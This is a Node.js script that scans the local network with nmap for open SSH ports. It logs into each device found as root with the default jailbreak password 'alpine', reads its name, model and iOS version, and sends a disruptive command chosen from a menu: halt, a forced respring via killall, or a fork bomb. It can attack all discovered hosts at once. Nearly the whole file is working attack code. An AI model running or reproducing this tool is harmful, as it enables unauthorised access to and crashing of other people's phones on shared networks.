/* eslint-disable no-console */
const os = require('os');
const ora = require('ora');
const chalk = require('chalk');
const inquirer = require('inquirer');
const {
	spawn
} = require('child_process');
const Client = require('ssh2').Client;

//First, list interfaces
const arrayOptions = [];
const interfaces = os.networkInterfaces();
const interfaceOptionKeys = Object.keys(interfaces);

for (const key in interfaceOptionKeys) {
	//Filter out internal interfaces
	if (!interfaces[interfaceOptionKeys[key]].internal) {
		const interface = interfaces[interfaceOptionKeys[key]][0];
		arrayOptions.push(`${interfaceOptionKeys[key]} (${interface.address}) [${interface.mac}]`);
	}
}

//Second ask question
inquirer.prompt([{
	type: 'list',
	name: 'interfaceOption',
	message: 'Which interface to use for scanning?',
	choices: arrayOptions
}]).then((result) => {
	const pickedInterface = result.interfaceOption.split(' ')[0];

	//Spawn the nmap process
	const nmap = spawn('nmap', ['-p 22', '-Pn', '--open', '-n', '-T5', '-e', `${pickedInterface}`, '-v', `${interfaces[pickedInterface][0].cidr}`]);

	//Spawn our spinner
	const spinner = ora(chalk.blue('Starting scan...')).start();

	//Catch open ports
	const targets = [];
	nmap.stdout.on('data', (data) => {
		const text = data.toString();
		if (text.toLowerCase().indexOf('discovered open port') >= 0) {
			const temp = text.split('\n');
			const part = temp[1].split(' ');
			targets.push(part[5]);
			spinner.clear();
			spinner.frame();
			console.log(chalk.green(`Discovered target ${part[5]}`));
			ora.text = chalk.blue(`Scanning... (${targets.length} targets)`);
		} else if (text.toLowerCase().indexOf('initiating') >= 0) {
			ora.text = chalk.blue(`Scanning... (${targets.length} targets)`);
		}
	});

	nmap.stderr.on('data', (data) => {
		spinner.clear();
		spinner.frame();
		console.log(chalk.red(`ERROR: ${data.toString()}`));
		process.exit();
	});

	nmap.on('close', () => {
		spinner.clear();
		spinner.frame();
		spinner.succeed(`Scan completed. ${targets.length} potential targets found.`);
		if (targets.length === 0) {
			console.log(chalk.yellow('No targets found. Exiting...'));
			process.exit();
		}

		targets.push('All');

		inquirer.prompt([{
			type: 'list',
			name: 'targetOption',
			message: `Which target? (${targets.length - 1} targets)`,
			choices: targets
		}]).then((result) => {
			if (result.targetOption === 'All') {
				inquirer.prompt([{
					type: 'list',
					name: 'actionOption',
					message: 'What would you like to do? (All is untested)',
					choices: ['Halt (Freezes then shutsdown device)', 'Respring (Resprings device', 'ForkBomb (Crashes device)']
				}]).then((result) => {
					let command;
					switch (result.toLowerCase().split(' ')[0]) {
					case 'halt':
						command = 'halt';
						break;
					case 'respring':
						command = 'killall -9 backboardd';
						break;
					case 'forkbomb':
						command = ':(){ :|: & };:';
						break;
					}

					targets.forEach((item) => {
						//BETA: UNTESTED
						if (item === 'All') {
							console.log(chalk.green('Done attacking targets.'));
							process.exit();
						} else {
							const conn = new Client();
							conn.on('ready', () => {
								console.log(chalk.green(`Successfully authenticated to ${item}!!`));
								//Get Device information
								conn.exec('scutil --get HostName && gssc | grep Product ', (err, stream) => {
									if (err) {
										console.log(chalk.red('Error getting information about phone.'));
									}

									let counter = 0;
									stream.on('data', (data) => {
										if (counter === 0) {
											console.log(chalk.blue(`Device Name: ${data.toString()}`));
										} else if (counter === 1) {
											const temp = data.toString().split('\n');
											temp[0] = temp[0].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
											temp[1] = temp[1].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
											temp[2] = temp[2].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
											console.log(chalk.blue(`Product Name: ${temp[0]}`));
											console.log(chalk.blue(`Device Model: ${temp[1]}`));
											console.log(chalk.blue(`iOS Version: ${temp[2]}`));
										}
										counter++;
									});

									stream.on('close', () => {
										conn.exec(command, (err, stream) => {
											if (err) {
												console.log(chalk.red(`Attack failed on ${item}.`));
											}

											stream.on('close', () => {
												console.log(chalk.green(`Completed attack on ${item}.`));
												conn.end();
											});
										});
									});
	
								});

							}).connect({
								host: item,
								port: 22,
								username: 'root',
								password: 'alpine'
							});

							conn.on('error', (err) => {
								if (err.level === 'client-authentication') {
									console.log(chalk.red(`Attack failed on ${item} - Incorrect password/username.`));
									return;
								} else {
									console.log(chalk.red(`Connection to ${item} failed.`));
									return;
								}
							});
						}
					});
				});
			} else {
				const conn = new Client();
				conn.on('ready', () => {
					console.log(chalk.green(`Successfully authenticated to ${result.targetOption}!!`));
					//Get Device information
					conn.exec('scutil --get HostName && gssc | grep Product ', (err, stream) => {
						if (err) {
							console.log(chalk.red('Error getting information about phone.'));
						}

						let counter = 0;
						stream.on('data', (data) => {
							if (counter === 0) {
								console.log(chalk.blue(`Device Name: ${data.toString()}`));
							} else if (counter === 1) {
								const temp = data.toString().split('\n');
								temp[0] = temp[0].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
								temp[1] = temp[1].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
								temp[2] = temp[2].replace(/\s+/g, '').replace(/['"]+/g, '').split('=')[1];
								console.log(chalk.blue(`Product Name: ${temp[0]}`));
								console.log(chalk.blue(`Device Model: ${temp[1]}`));
								console.log(chalk.blue(`iOS Version: ${temp[2]}`));
							}
							counter++;
						});

						stream.on('close', () => {
							inquirer.prompt([{
								type: 'list',
								name: 'actionOption',
								message: 'What would you like to do?',
								choices: ['Halt (Freezes then shutsdown device)', 'Respring (Resprings device', 'ForkBomb (Crashes device)']
							}]).then((result) => {
								let command;
								switch (result.toLowerCase().split(' ')[0]) {
								case 'halt':
									command = 'halt';
									break;
								case 'respring':
									command = 'killall -9 backboardd';
									break;
								case 'forkbomb':
									command = ':(){ :|: & };:';
									break;
								}

								conn.exec(command, (err, stream) => {
									if (err) {
										console.log(chalk.red('Error running attack.'));
									}

									stream.on('close', () => {
										console.log(chalk.green('Attack completed successfully!'));
										conn.end();
									});
								});
							});
						});
					});

				}).connect({
					host: result.targetOption,
					port: 22,
					username: 'root',
					password: 'alpine'
				});

				conn.on('error', (err) => {
					if (err.level === 'client-authentication') {
						console.log(chalk.red(`Attack failed on ${result.targetOption} - Incorrect password/username. Exiting.`));
						process.exit();
					} else {
						console.log(chalk.red(`Connection to ${result.targetOption} failed. Exiting.`));
						process.exit();
					}
				});
			}
		});
	});
});